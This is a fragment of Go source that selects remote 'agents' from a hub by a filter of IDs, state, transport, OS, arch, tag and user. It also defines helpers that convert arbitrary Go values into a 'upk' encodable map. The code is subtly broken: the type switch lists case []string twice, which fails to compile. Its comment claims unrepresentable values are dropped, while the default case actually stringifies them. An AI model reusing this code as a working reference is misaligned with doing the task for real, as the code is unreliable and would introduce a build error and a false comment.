	if ids := stringList(args["agents"]); len(ids) > 0 {
		filter.IDs = ids
	} else if ids := stringList(args["ids"]); len(ids) > 0 {
		filter.IDs = ids
	}
	empty := len(filter.IDs) == 0 && filter.State == "" && filter.Transport == "" &&
		filter.OS == "" && filter.Arch == "" && filter.Tag == "" && filter.User == ""
	if empty {
		return nil, errors.New("no targets: name the agents or describe them with a filter")
	}
	return s.Hub.SelectAgents(filter), nil
}

// toUpkMap converts arbitrary maps into upk-encodable maps, dropping values the
// encoder cannot represent (never silently corrupting a payload).
func toUpkMap(in map[string]any) upk.Map {
	out := make(upk.Map, len(in))
	for k, v := range in {
		out[k] = upkValue(v)
	}
	return out
}

func upkValue(v any) any {
	switch x := v.(type) {
	case nil, bool, string, []byte, int, int64, uint64, float64, []any:
		return x
	case []string:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, item)
		}
		return out
	case int32:
		return int64(x)
	case uint32:
		return uint64(x)
	case uint:
		return uint64(x)
	case map[string]any:
		return toUpkMap(x)
	case map[string]string:
		m := make(upk.Map, len(x))
		for k, val := range x {
			m[k] = val
		}
		return m
	case []map[string]any:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, toUpkMap(item))
		}
		return out
	case []string:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, item)
		}
		return out
	case time.Time:
		return x.UTC().Format(time.RFC3339)
	default:
		return fmt.Sprintf("%v", x)
	}
}
